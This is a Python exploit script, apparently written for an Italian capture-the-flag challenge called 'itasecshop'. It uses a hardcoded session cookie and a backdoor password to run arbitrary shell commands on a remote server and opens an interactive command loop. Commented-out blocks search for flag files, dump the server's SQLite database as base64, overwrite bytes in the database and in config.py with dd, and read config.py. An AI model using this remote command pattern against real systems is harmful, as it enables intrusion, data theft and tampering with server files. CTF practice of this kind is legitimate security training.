import requests, base64, os

psw = '---P4ssw0rd$$$$$$uperSicura@@###!meaw---'

buy_url = "http://itasecshop.challs.olicyber.it/store/{}/buy"
meow_url = "http://itasecshop.challs.olicyber.it/cats"

cookies = {
    "session": ".eJyrVkpLzMxJTYlPKq1UsjLQgXFz8tMz88ACpcWpRUpWSqV5mSWVSrUAk6cQWA.Z8NF0Q.ZyG3szFJUDrNxiqjQcpWk4EBi9o"
}

headers = {
     "Content-Type": "application/x-www-form-urlencoded",
     "User-Agent": "samsung smart fridge"
}

# r1 = requests.post(buy_url.format(5), data={}, headers=headers, cookies=cookies)

# params = {
#     "psw": psw,
#     #"cmd": "find /var -type f -name '*flag*'"
#     "cmd": "ls /"
# }
# r2 = requests.get(meow_url, params=params, headers=headers, cookies=cookies)
# dirs = r2.text.split("\n")
#
# flag_files = []
# for d in dirs:
#     print(d)
#     params = {
#         "psw": psw,
#         "cmd": "find /{} -type f -name '*flag*'".format(d)
#     }
#     r3 = requests.get(meow_url, params=params, headers=headers, cookies=cookies)
#     if r3.text.strip() != "":
#         flag_files.extend(r3.text.split("\n"))
#
# print('\n'.join(flag_files))

# params = {
#     "psw": psw,
#     "cmd": "base64 db/database.db"
# }
#
# r2 = requests.get(meow_url, params=params, headers=headers, cookies=cookies)
# db = base64.b64decode(r2.text.strip())
#
# open("db.sqlite", "wb").write(db)
#
# pos = os.popen('grep -oba "La maglietta ufficiale dei M0nt3c4rl0" db.sqlite').read().strip()
# pos = int(pos.split(":")[0])
#
# msg = "Timeout troppo breve ragazzi!!" 
# msg = msg.ljust(len("La maglietta ufficiale dei M0nt3c4rl0"), ' ')
#
# print("Patching pos:", pos)
#
# cmd = 'echo -n "{}" | dd of=db.sqlite bs=4096 seek={} conv=notrunc && echo "OK"'.format(msg, pos)
# print(cmd)
# params = {
#     "psw": psw,
#     "cmd": cmd
# }
#
# r2 = requests.get(meow_url, params=params, headers=headers, cookies=cookies)
# print(r2.text)
#
#
# params = {
#     "psw": psw,
#     "cmd": "cat config.py"
# }
#
# r2 = requests.get(meow_url, params=params, headers=headers, cookies=cookies)
# print(r2.text)

def execute_cmd(cmd) -> str:
    params = {
        "psw": psw,
        "cmd": cmd
    }

    r2 = requests.get(meow_url, params=params, headers=headers, cookies=cookies)
    return r2.text

while True:
    cmd = input("cmd> ")
    print(execute_cmd(cmd))

# og_msg = "La maglietta ufficiale dei M0nt3c4rl0"
# conf_pos = int(execute_cmd(f'grep -oba "{og_msg}" config.py').strip().split(":")[0])
#
# msg = "Timeout troppo breve"
# msg = msg.ljust(len(og_msg), ' ')
#
# cmd = f'echo -n "{msg}" | dd of=config.py bs=4096 seek={conf_pos} conv=notrunc && echo "OK"'
# print(execute_cmd(cmd))
